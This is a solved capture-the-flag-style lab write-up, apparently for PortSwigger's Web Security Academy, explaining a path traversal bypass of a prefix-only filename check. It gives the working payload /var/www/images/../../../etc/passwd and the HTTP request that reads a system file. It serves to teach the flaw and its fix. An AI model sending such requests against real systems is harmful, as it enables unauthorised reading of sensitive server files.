# Path Traversal — Validation of start of path


**Difficulty:** Practitioner

**Status:** ✅ Solved



## Overview



This lab contains a **Path Traversal** vulnerability in the functionality that displays product images.



The application sends the full file path through a request parameter and validates that the supplied path starts with 
the expected directory.



The goal is to retrieve the contents of:


```text

/etc/passwd

```



---



## Initial Request



The original request was:


```http

GET /image?filename=/var/www/images/28.jpg HTTP/2

```



The vulnerable parameter is:



```text

filename=/var/www/images/28.jpg

```



The expected directory is:



```text

/var/www/images/

```



---



## The Validation


The application checks whether the supplied path starts with:



```text

/var/www/images/

```



For example:


```text

/var/www/images/28.jpg

```



passes the validation because it starts with the expected directory.



However, the application does not properly validate the **final resolved path** after processing traversal sequences.



---



## Exploitation



We can keep the required directory at the beginning of the path and append traversal sequences:



```text

/var/www/images/../../../etc/passwd
```



The resulting request is:



```http

GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2

```



The path passes the prefix validation because it starts with:



```text
/var/www/images/

```




However, when the filesystem resolves the `../` sequences, the path becomes:

```text

/var/www/images/../../../etc/passwd

        ↓

/var/www/

        ↓

/var/

        ↓

/

        ↓

/etc/passwd
```


The application therefore accesses:



```text


/etc/passwd

```



and returns its contents.



---


## Attack Flow


```text

User-controlled path
        ↓

/var/www/images/../../../etc/passwd

        ↓

Starts with the expected directory?

        ↓

YES ✓

        ↓

Path resolution

        ↓

/etc/passwd

```




---



## Key Takeaways



* Validating only the **prefix** of a file path is not sufficient.

* A path can start with an allowed directory while still escaping it using `../`.

* The application should validate the **canonical/resolved path**, not just the original string.

* When analyzing Path Traversal, check whether the application validates the beginning of the path.

* If only the prefix is validated, try placing traversal sequences **after the allowed directory**.



## Lab Payload



```text

/var/www/images/../../../etc/passwd

```



**Result:** Retrieved `/etc/passwd` and solved the lab. ✅



## References



* PortSwigger Web Security Academy — Path Traversal
  https://portswigger.net/web-security/file-path-traversal



* OWASP — Path Traversal
  https://owasp.org/www-community/attacks/Path_Traversal

